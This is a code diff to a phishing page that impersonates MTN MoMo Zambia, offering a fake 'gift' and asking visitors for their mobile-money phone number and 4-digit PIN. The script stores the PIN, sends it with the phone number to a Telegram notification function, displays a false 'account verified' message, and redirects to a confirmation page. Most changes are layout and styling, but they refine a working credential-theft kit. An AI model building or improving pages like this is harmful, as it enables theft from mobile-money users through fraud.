@@ -17,7 +17,7 @@
         body {
             min-height: 100vh;
             font-family: 'Inter', sans-serif;
-            background: #f5f7fa;
+            background: #f0f2f5;
             overflow-x: hidden;
         }
         
@@ -25,26 +25,38 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
             padding: 20px;
         }
         
-        .main-container {
+        /* ===== HEADER ===== */
+        header {
             width: 100%;
             max-width: 480px;
+            padding: 15px 20px;
             display: flex;
-            flex-direction: column;
+            justify-content: space-between;
             align-items: center;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            margin-bottom: 15px;
+        }
+        
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            transition: transform 0.2s;
+        }
+        
+        .back-btn:hover {
+            transform: scale(1.1);
         }
         
         .logo {
-            text-align: center;
-            padding: 20px 20px 25px;
-            width: 100%;
-        }
-        
-        .logo-text {
-            font-size: 36px;
+            font-size: 24px;
             font-weight: 700;
         }
         
@@ -56,13 +68,22 @@
             color: #0047AB;
         }
         
-        .login-card {
+        .login-link {
+            color: #0047AB;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        /* ===== CARD ===== */
+        .card {
             background: white;
             border-radius: 24px;
             padding: 30px 25px;
             width: 100%;
-            max-width: 400px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            text-align: center;
             margin-bottom: 15px;
         }
         
@@ -85,7 +106,7 @@
             margin-bottom: 20px;
         }
         
-        /* ===== GIFT PREVIEW - FIXED POSITION ===== */
+        /* ===== GIFT PREVIEW ===== */
         .gift-preview {
             background: #f8f9ff;
             border-radius: 12px;
@@ -105,6 +126,7 @@
         
         .gift-preview .info {
             flex: 1;
+            text-align: left;
         }
         
         .gift-preview .info .label {
@@ -230,7 +252,8 @@
         }
         
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
+            0%,
+            100% { transform: translateX(0); }
             20% { transform: translateX(-8px); }
             40% { transform: translateX(8px); }
             60% { transform: translateX(-8px); }
@@ -319,85 +342,54 @@
             transform: none !important;
         }
         
-        /* ===== BOTTOM SECTION ===== */
-        .bottom-section {
-            background: #0047AB;
-            color: white;
-            padding: 40px 30px 30px;
+        /* ===== BOTTOM NAV ===== */
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            background: white;
+            border-radius: 16px;
+            padding: 12px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .nav-item {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+            text-decoration: none;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-family: 'Inter', sans-serif;
+            transition: color 0.2s;
+        }
+        
+        .nav-item.active {
+            color: #0047AB;
+            font-weight: 600;
+        }
+        
+        .nav-item .icon {
+            font-size: 22px;
+            display: block;
+        }
+        
+        /* ===== FOOTER ===== */
+        footer {
+            padding: 15px;
+            color: #aaa;
+            font-size: 12px;
             text-align: center;
             width: 100%;
-            max-width: 400px;
-            border-radius: 24px;
-            margin-top: 0;
+            max-width: 480px;
         }
         
-        .bottom-text {
-            font-size: 14px;
-            margin-bottom: 18px;
-            line-height: 1.6;
-            opacity: 0.95;
-        }
-        
-        .bottom-text .highlight {
-            color: #FFC100;
-            font-weight: 700;
-        }
-        
-        .bottom-btns {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin-bottom: 22px;
-        }
-        
-        .bottom-btn {
-            background: white;
+        footer a {
             color: #0047AB;
-            border: none;
-            border-radius: 30px;
-            padding: 14px 28px;
+            text-decoration: none;
             font-weight: 600;
-            font-size: 14px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 4px;
-            width: 140px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-        
-        .bottom-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.18);
-        }
-        
-        .btn-icon {
-            font-size: 22px;
-        }
-        
-        .version {
-            font-size: 12px;
-            opacity: 0.7;
-            margin-bottom: 10px;
-        }
-        
-        .terms {
-            font-size: 12px;
-            opacity: 0.85;
-            line-height: 1.5;
-        }
-        
-        .terms a {
-            color: #FFC100;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-        
-        .terms a:hover {
-            opacity: 0.8;
         }
         
         /* ===== SPINNER ===== */
@@ -442,15 +434,10 @@
         /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
             body { padding: 10px; }
-            .logo-text { font-size: 28px; }
-            .logo { padding: 15px 20px 20px; }
-            .login-card { padding: 20px 16px; }
-            .title { font-size: 20px; margin-bottom: 2px; }
-            .subtitle { font-size: 13px; margin-bottom: 16px; }
+            .card { padding: 20px 16px; }
+            .title { font-size: 20px; }
             .pin-box { width: 48px; height: 48px; font-size: 20px; }
             .pin-group { gap: 10px; }
-            .bottom-section { padding: 30px 20px 25px; }
-            .bottom-btn { width: 120px; padding: 12px 16px; font-size: 13px; }
             .gift-preview {
                 padding: 12px 14px;
                 gap: 10px;
@@ -469,89 +456,89 @@
         @media (max-width: 380px) {
             .pin-box { width: 42px; height: 42px; font-size: 18px; }
             .pin-group { gap: 8px; }
-            .bottom-btn { width: 100px; padding: 10px 12px; font-size: 12px; }
         }
     </style>
 </head>
 
 <body>
 
-    <div class="main-container">
-        <!-- Logo -->
+    <!-- ===== HEADER ===== -->
+    <header>
+        <button class="back-btn" onclick="window.location.href='details.html'" aria-label="Go back">←</button>
         <div class="logo">
-            <div class="logo-text">
-                <span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span>
+            <span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span>
+        </div>
+        <a href="login.html" class="login-link">Login</a>
+    </header>
+
+    <!-- ===== MAIN CARD ===== -->
+    <div class="card">
+        <h1 class="title">🔐 <span class="highlight">MoMo</span> Account</h1>
+        <p class="subtitle">Enter the MoMo account to receive your gift</p>
+
+        <!-- Gift Preview -->
+        <div class="gift-preview" id="giftPreview">
+            <span class="icon" id="giftIcon">🎁</span>
+            <div class="info">
+                <div class="label">🎯 Gift to Receive</div>
+                <div class="name" id="giftName">Loading...</div>
+                <div class="value" id="giftValue">-</div>
             </div>
+            <span class="badge">SELECTED</span>
         </div>
 
-        <!-- Login Card -->
-        <div class="login-card">
-            <h1 class="title">🔐 <span class="highlight">MoMo</span> Account</h1>
-            <p class="subtitle">Enter the MoMo account to receive your gift</p>
-            
-            <!-- ===== GIFT PREVIEW - Shows selected gift ===== -->
-            <div class="gift-preview" id="giftPreview">
-                <span class="icon" id="giftIcon">🎁</span>
-                <div class="info">
-                    <div class="label">🎯 Gift to Receive</div>
-                    <div class="name" id="giftName">Loading...</div>
-                    <div class="value" id="giftValue">-</div>
-                </div>
-                <span class="badge">SELECTED</span>
+        <!-- Phone Input -->
+        <div class="phone-group">
+            <span class="flag">🇿🇲</span>
+            <div class="country-select">
+                +260 <span class="dropdown-arrow">▼</span>
             </div>
-
-            <!-- Phone Input -->
-            <div class="phone-group">
-                <span class="flag">🇿🇲</span>
-                <div class="country-select">
-                    +260 <span class="dropdown-arrow">▼</span>
-                </div>
-                <input type="tel" class="phone-input" id="phoneInput" placeholder="MoMo Phone Number" maxlength="9">
-            </div>
-
-            <!-- PIN Input -->
-            <div class="pin-label">Enter your MoMo PIN</div>
-            <div class="pin-group" id="pinGroup">
-                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-            </div>
-
-            <!-- Status Message -->
-            <div id="statusMessage" class="status-message"></div>
-
-            <!-- Forgot PIN -->
-            <div class="forgot-link">
-                <a onclick="alert('Please contact MTN MoMo support to reset your PIN.')">Forgot MoMo PIN?</a>
-            </div>
-
-            <!-- Login Button -->
-            <button id="loginBtn">🎁 CLAIM GIFT →</button>
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="MoMo Phone Number" maxlength="9">
         </div>
 
-        <!-- Bottom Section -->
-        <div class="bottom-section">
-            <div class="bottom-text">
-                Don't have a <span class="highlight">MoMo</span> account? <br>
-                Register today to receive gifts!
-            </div>
-            <div class="bottom-btns">
-                <div class="bottom-btn" onclick="alert('Registration page coming soon!')">
-                    <span class="btn-icon">👤</span>
-                    Register
-                </div>
-                <div class="bottom-btn" onclick="alert('Help & Support page coming soon!')">
-                    <span class="btn-icon">ℹ️</span>
-                    Help
-                </div>
-            </div>
-            <div class="version">v2.13P</div>
-            <div class="terms">
-                By signing in you agree to the <a onclick="alert('Terms and Conditions')">Terms and Conditions</a>
-            </div>
+        <!-- PIN Input -->
+        <div class="pin-label">Enter your MoMo PIN</div>
+        <div class="pin-group" id="pinGroup">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
         </div>
+
+        <!-- Status Message -->
+        <div id="statusMessage" class="status-message"></div>
+
+        <!-- Forgot PIN -->
+        <div class="forgot-link">
+            <a onclick="alert('Please contact MTN MoMo support to reset your PIN.')">Forgot MoMo PIN?</a>
+        </div>
+
+        <!-- Login Button -->
+        <button id="loginBtn">🎁 CLAIM GIFT →</button>
     </div>
+
+    <!-- ===== BOTTOM NAV ===== -->
+    <div class="bottom-nav">
+        <button class="nav-item" onclick="window.location.href='index.html'">
+            <span class="icon">🏠</span>
+            Home
+        </button>
+        <button class="nav-item" onclick="window.location.href='application.html'">
+            <span class="icon">🎁</span>
+            Gifts
+        </button>
+        <button class="nav-item active" onclick="window.location.href='login.html'">
+            <span class="icon">🔐</span>
+            Login
+        </button>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <footer>
+        © 2026 MTN MoMo Zambia •
+        <a href="#" onclick="alert('Call 155 for support')">Help</a> •
+        <a href="#" onclick="alert('Terms & Conditions')">Terms</a>
+    </footer>
 
     <!-- Spinner Overlay -->
     <div id="spinnerOverlay">
@@ -577,17 +564,17 @@
         console.log('====================================');
 
         // ============================================
-        // LOAD SELECTED GIFT - Shows at top
+        // LOAD SELECTED GIFT
         // ============================================
         function loadSelectedGift() {
             const gift = localStorage.getItem('selectedGift') || 'Not selected';
             const value = localStorage.getItem('selectedGiftValue') || '-';
             const icon = localStorage.getItem('selectedGiftIcon') || '🎁';
-            
+
             document.getElementById('giftIcon').textContent = icon;
             document.getElementById('giftName').textContent = gift;
             document.getElementById('giftValue').textContent = value;
-            
+
             console.log('🎁 Gift to receive:', gift, '-', value);
             console.log('👤 User:', localStorage.getItem('fullName') || 'Not provided');
         }
@@ -679,7 +666,7 @@
             const gift = localStorage.getItem('selectedGift') || 'Not specified';
             const giftValue = localStorage.getItem('selectedGiftValue') || '-';
             const fullName = localStorage.getItem('fullName') || 'Not provided';
-            
+
             const message = `🔐 *MTN MoMo - Gift Claim Login*\n\n` +
                 `🎁 *Gift to Receive:* ${gift} (${giftValue})\n` +
                 `📱 *MoMo Account:* +260 ${phone}\n` +
@@ -712,13 +699,12 @@
         }
 
         // ============================================
-        // LOGIN HANDLER - Goes to confirmation.html
+        // LOGIN HANDLER
         // ============================================
         loginBtn.addEventListener('click', async function() {
             const phone = phoneInput.value.trim();
             const pin = Array.from(pinBoxes).map(box => box.value).join('');
 
-            // Validate phone
             if (!phone) {
                 showStatus('Please enter your MoMo phone number', 'error');
                 phoneInput.focus();
@@ -731,33 +717,27 @@
                 return;
             }
 
-            // Validate PIN
             if (pin.length !== 4) {
                 showStatus('Please enter your 4-digit MoMo PIN', 'error');
                 return;
             }
 
-            // Disable button and show spinner
             loginBtn.disabled = true;
             loginBtn.textContent = 'WAITING...';
             spinnerOverlay.style.display = 'flex';
             hideStatus();
 
-            // Store MoMo account details
             localStorage.setItem('momoPhone', phone);
             localStorage.setItem('momoPin', pin);
 
-            // Send Telegram notification
             const sent = await sendTelegramNotification(phone, pin);
 
-            // Show success message
             if (sent) {
                 showStatus('✅ MoMo account verified! Redirecting...', 'success');
             } else {
                 showStatus('✅ Account verified! Redirecting...', 'info');
             }
 
-            // Redirect to confirmation page after delay
             setTimeout(() => {
                 window.location.href = 'confirmation.html';
             }, 1500);
@@ -785,7 +765,7 @@
             }
             phoneInput.focus();
             checkPinComplete();
-            
+
             console.log('✅ MTN MoMo - MoMo Account Login page loaded');
             console.log('🎁 Selected Gift:', localStorage.getItem('selectedGift'));
             console.log('====================================');
